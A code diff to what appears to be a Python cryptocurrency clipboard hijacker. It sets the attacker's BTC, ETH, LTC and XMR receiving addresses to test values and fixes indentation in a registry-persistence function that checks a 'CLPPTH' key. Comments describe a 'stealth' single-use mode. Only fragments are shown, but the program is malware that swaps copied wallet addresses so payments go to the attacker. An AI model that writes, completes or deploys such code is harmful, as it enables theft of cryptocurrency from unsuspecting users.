@@ -6,10 +6,10 @@ import sys
 import re
 import os
 
-btcaddr = "SET BTC ADDRESS HERE"  # if no BTC address leave as SET BTC ADDRESS HERE
-ethaddr = "SET ETH ADDRESS HERE"  # if no ETH address leave as SET ETH ADDRESS HERE
-ltcaddr = "SET LTC ADDRESS HERE"  # if no LTC address leave as SET LTC ADDRESS HERE
-xmraddr = "SET XMR ADDRESS HERE"  # if no XMR address leave as SET XMR ADDRESS HERE
+btcaddr = "btc tst"  # if no BTC address leave as SET BTC ADDRESS HERE
+ethaddr = "eth tst"  # if no ETH address leave as SET ETH ADDRESS HERE
+ltcaddr = "ltc tst"  # if no LTC address leave as SET LTC ADDRESS HERE
+xmraddr = "xmr tst"  # if no XMR address leave as SET XMR ADDRESS HERE
 
 single_use = False  # if set to True, program will only ever clip one address. After this happens it wont ever clip again. Sort of like a stealth module.
 
@@ -107,7 +107,7 @@ def add_reg(dupe_path):
                 winreg.QueryValueEx(reg_key, "CLPPTH")
             except:
                 pass
-   except:
+    except:
         pass
 
 def check():
